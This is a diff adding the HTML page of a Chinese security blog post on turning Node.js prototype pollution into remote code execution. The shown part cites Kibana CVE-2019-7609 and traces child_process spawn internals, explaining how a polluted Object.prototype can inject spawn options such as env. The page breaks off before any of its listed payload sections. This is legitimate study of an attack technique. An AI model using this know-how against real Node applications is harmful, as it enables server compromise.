@@ -1,0 +1,959 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>PP2RCE | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Echild-process%E7%9A%84spawn"><span class="toc-number">2.</span> <span class="toc-text">关于child_process的spawn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kibana-RCE%EF%BC%88CVE-2019-7609%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">Kibana-RCE（CVE-2019-7609）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PP2RCE%EF%BC%88Prototype-Pollution-to-RCE%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">PP2RCE（Prototype Pollution to RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.</span> <span class="toc-text">通过环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#via-env-vars-cmdline"><span class="toc-number">4.2.</span> <span class="toc-text">via env vars + cmdline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.3.</span> <span class="toc-text">DNS探测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%BB%B6%E4%BC%B8%E5%87%BAchild-process-%E4%B8%8B%E5%85%B6%E5%AE%83%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">上述两种方法延伸出child_process 下其它函数利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">5.1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execFile"><span class="toc-number">5.2.</span> <span class="toc-text">execFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spawn"><span class="toc-number">5.3.</span> <span class="toc-text">spawn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execFileSync"><span class="toc-number">5.4.</span> <span class="toc-text">execFileSync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execSync"><span class="toc-number">5.5.</span> <span class="toc-text">execSync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spawnSync"><span class="toc-number">5.6.</span> <span class="toc-text">spawnSync</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8spawn"><span class="toc-number">6.</span> <span class="toc-text">主动调用spawn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%AE%BE%E7%BD%AE-require-%E8%B7%AF%E5%BE%84"><span class="toc-number">6.1.</span> <span class="toc-text">原型链污染设置 require 路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9require"><span class="toc-number">6.1.1.</span> <span class="toc-text">绝对require</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%AF%B9require"><span class="toc-number">6.1.2.</span> <span class="toc-text">相对require</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VM-Gadgets"><span class="toc-number">7.</span> <span class="toc-text">VM Gadgets</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>PP2RCE</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/11
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Nodejs/" style="color: #00bcd4">Nodejs</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">4.2k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">21分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://xz.aliyun.com/t/6755">http://xz.aliyun.com/t/6755</a></p>
+<p><a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">https://www.sonarsource.com/blog/blitzjs-prototype-pollution/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cnily03/tech/lg05qpua2gz8yf89#">https://www.yuque.com/cnily03/tech/lg05qpua2gz8yf89#</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="关于child-process的spawn"><a href="#关于child-process的spawn" class="headerlink" title="关于child_process的spawn"></a>关于child_process的spawn</h1><p>在一开始学习<a href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#child-process">nodejs漏洞</a>的时候就提过，child_process 内置的6个函数底层最终都会调用 spawn</p>
+<p>nodejs内部模块的调试参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012961419/article/details/120664191">https://blog.csdn.net/u012961419/article/details/120664191</a></p>
+<p>注：参考文章中的node版本在 v8.x 之前：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js">https://github.com/nodejs/node/blob/v8.x/lib/child_process.js</a></p>
+<p>本文将会对照本人所用的 v18.x 版本和参考版本的代码进行撰写</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">child<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">file</span><span class="token operator">:</span> opts<span class="token punctuation">.</span>file<span class="token punctuation">,</span>
+    <span class="token literal-property property">args</span><span class="token operator">:</span> opts<span class="token punctuation">.</span>args<span class="token punctuation">,</span>
+    <span class="token literal-property property">cwd</span><span class="token operator">:</span> options<span class="token punctuation">.</span>cwd<span class="token punctuation">,</span>
+    <span class="token literal-property property">windowsHide</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>options<span class="token punctuation">.</span>windowsHide<span class="token punctuation">,</span>
+    <span class="token literal-property property">windowsVerbatimArguments</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>options<span class="token punctuation">.</span>windowsVerbatimArguments<span class="token punctuation">,</span>
+    <span class="token literal-property property">detached</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>options<span class="token punctuation">.</span>detached<span class="token punctuation">,</span>
+    <span class="token literal-property property">envPairs</span><span class="token operator">:</span> opts<span class="token punctuation">.</span>envPairs<span class="token punctuation">,</span>
+    <span class="token literal-property property">stdio</span><span class="token operator">:</span> options<span class="token punctuation">.</span>stdio<span class="token punctuation">,</span>
+    <span class="token literal-property property">uid</span><span class="token operator">:</span> options<span class="token punctuation">.</span>uid<span class="token punctuation">,</span>
+    <span class="token literal-property property">gid</span><span class="token operator">:</span> options<span class="token punctuation">.</span>gid
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以下面的代码为例：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>data<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Node使用模块<code>child_process</code>建立子进程时，调用用户层面的 spawn 方法。初始化子进程的参数，步入<code>normalizeSpawnArguments</code></p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011170055597.png" alt="image-20241011170055597"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L501">https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L501</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> spawn <span class="token operator">=</span> exports<span class="token punctuation">.</span><span class="token function-variable function">spawn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token comment">/*file, args, options*/</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">var</span> opts <span class="token operator">=</span> <span class="token function">normalizeSpawnArguments</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>跟进<code>normalizeSpawnArguments</code></p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011170728758.png" alt="image-20241011170728758"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L387">https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L387</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">normalizeSpawnArguments</span><span class="token punctuation">(</span><span class="token parameter">file<span class="token punctuation">,</span> args<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token operator">...</span><span class="token comment">//省略</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>options <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
+    options <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+    <span class="token operator">...</span><span class="token comment">//省略</span>
+  <span class="token keyword">var</span> env <span class="token operator">=</span> options<span class="token punctuation">.</span>env <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">;</span>
+  <span class="token keyword">var</span> envPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> env<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    envPairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">'='</span> <span class="token operator">+</span> env<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">_convertCustomFds</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">file</span><span class="token operator">:</span> file<span class="token punctuation">,</span>
+    <span class="token literal-property property">args</span><span class="token operator">:</span> args<span class="token punctuation">,</span>
+    <span class="token literal-property property">options</span><span class="token operator">:</span> options<span class="token punctuation">,</span>
+    <span class="token literal-property property">envPairs</span><span class="token operator">:</span> envPairs
+  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当 options 不存在时将其命为空对象</p>
+<p>然后获取 env 变量，首先对 options.env 是否存在做了判断，如果 options.env 为undefined则将环境变量<code>process.env</code>的值复制给 env</p>
+<p>而后对 envPairs 这个数组进行push操作，其实就是 env 变量对应的键值对</p>
+<p>在 node v18.0 中，它的代码变成了下面的形式：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> envKeys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> value <span class="token operator">=</span> env<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">validateArgumentNullCheck</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">options.env['</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">']</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">validateArgumentNullCheck</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">options.env['</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">']</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">ArrayPrototypePush</span><span class="token punctuation">(</span>envPairs<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用几个方法封装了同样的操作，不影响</p>
+<p>很明显这里存在一个原型链污染的问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能</p>
+<p>只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code></p>
+<br>
+
+<p>经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部 child_process 的实现</p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011171703419.png" alt="image-20241011171703419"></p>
+<p>观察一下原生的spawn源码实现：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">ChildProcess</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">spawn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+  <span class="token function">validateObject</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> <span class="token string">'options'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// If no `stdio` option was given - use default</span>
+  <span class="token keyword">let</span> stdio <span class="token operator">=</span> options<span class="token punctuation">.</span>stdio <span class="token operator">||</span> <span class="token string">'pipe'</span><span class="token punctuation">;</span>
+
+  stdio <span class="token operator">=</span> <span class="token function">getValidStdio</span><span class="token punctuation">(</span>stdio<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">const</span> ipc <span class="token operator">=</span> stdio<span class="token punctuation">.</span>ipc<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> ipcFd <span class="token operator">=</span> stdio<span class="token punctuation">.</span>ipcFd<span class="token punctuation">;</span>
+  stdio <span class="token operator">=</span> options<span class="token punctuation">.</span>stdio <span class="token operator">=</span> stdio<span class="token punctuation">.</span>stdio<span class="token punctuation">;</span>
+
+
+  <span class="token function">validateOneOf</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>serialization<span class="token punctuation">,</span> <span class="token string">'options.serialization'</span><span class="token punctuation">,</span>
+                <span class="token punctuation">[</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'advanced'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">const</span> serialization <span class="token operator">=</span> options<span class="token punctuation">.</span>serialization <span class="token operator">||</span> <span class="token string">'json'</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ipc <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// Let child process know about opened IPC channel</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>envPairs <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
+      options<span class="token punctuation">.</span>envPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+      <span class="token function">validateArray</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>envPairs<span class="token punctuation">,</span> <span class="token string">'options.envPairs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">ArrayPrototypePush</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>envPairs<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">NODE_CHANNEL_FD=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ipcFd<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ArrayPrototypePush</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>envPairs<span class="token punctuation">,</span>
+                       <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">NODE_CHANNEL_SERIALIZATION_MODE=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>serialization<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">validateString</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>file<span class="token punctuation">,</span> <span class="token string">'options.file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>spawnfile <span class="token operator">=</span> options<span class="token punctuation">.</span>file<span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>args <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>spawnargs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">validateArray</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>args<span class="token punctuation">,</span> <span class="token string">'options.args'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>spawnargs <span class="token operator">=</span> options<span class="token punctuation">.</span>args<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_handle<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// Run-time errors should emit an error, not throw an exception.</span>
